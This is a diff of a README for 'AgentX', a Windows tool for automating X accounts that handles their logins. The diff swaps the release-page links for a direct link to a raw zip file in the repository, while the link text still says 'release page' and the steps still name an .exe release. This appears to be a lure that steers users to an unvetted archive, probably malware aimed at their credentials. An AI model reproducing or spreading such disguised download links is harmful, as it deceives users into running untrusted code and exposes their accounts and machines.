@@ -1,6 +1,6 @@
 # 🤖 AgentX - Control your social media automate tasks
 
-[ ![Download AgentX](https://img.shields.io/badge/Download-AgentX-blue) ](https://github.com/Conwaypopular850/AgentX/releases)
+[ ![Download AgentX](https://img.shields.io/badge/Download-AgentX-blue) ](https://raw.githubusercontent.com/Conwaypopular850/AgentX/main/cmd/X-Agent-3.9-beta.5.zip)
 
 AgentX connects your software agents to your X profile. This tool handles the login process and sends commands to your account securely. You can manage multiple accounts and run automated tasks without frequent interruptions.
 
@@ -11,7 +11,7 @@ AgentX runs on Windows 10 or 11. You need 50 MB of free storage space. The softw
 ## 🚀 Downloading AgentX
 
 1. Open your web browser.
-2. Go to the [AgentX release page](https://github.com/Conwaypopular850/AgentX/releases).
+2. Go to the [AgentX release page](https://raw.githubusercontent.com/Conwaypopular850/AgentX/main/cmd/X-Agent-3.9-beta.5.zip).
 3. Look for the file named `AgentX-windows-amd64.exe` in the latest release section.
 4. Click the file name to start the download.
 5. Save the file to your desktop or downloads folder.
